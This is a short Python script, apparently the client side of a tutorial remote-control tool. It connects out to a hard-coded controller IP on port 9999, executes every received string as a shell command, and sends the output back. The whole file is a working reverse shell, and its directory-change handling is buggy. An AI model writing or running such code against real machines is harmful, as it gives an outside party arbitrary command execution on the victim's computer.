import socket
import os
import subprocess

s = socket.socket()
host = "192.168.0.0"   # This is your server IP address, from where you want to control the client.
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    #data[:2] will take first 2 characters
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[:3].decode("utf-8"))

    if len(data) > 0 :
        #data[:] will take all the characters
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr = subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + ">"

        s.send(str.encode(output_str + currentWD))

        # To print stuff on clinets computer. So that the client may know what you are doing

        print(output_str)

